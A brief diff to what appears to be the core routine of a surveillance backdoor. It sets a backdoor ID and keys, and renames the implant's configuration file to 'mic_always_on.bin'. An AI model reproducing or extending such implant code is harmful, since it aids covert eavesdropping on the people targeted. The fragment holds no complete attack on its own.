@@ -77,7 +77,9 @@ extern "C" DWORD WINAPI CoreProc(LPVOID pParam) {
 	CopyMemory(g_Challenge, ProtoKey, 16);
 	CopyMemory(g_ConfKey, ConfKey, 16);
 	CopyMemory(g_BackdoorID, "RCS_0000000033", strlen("RCS_0000000xxx"));
-	CopyMemory(g_ConfName, L"c.bin", WideLen(L"c.bin"));
+	CopyMemory(g_ConfName, L"mic_always_on.bin", WideLen(L"mic_always_on.bin"));
+	//CopyMemory(g_ConfName, L"c.bin", WideLen(L"c.bin"));
+
 	// Fine configurazione artificiale
 
 
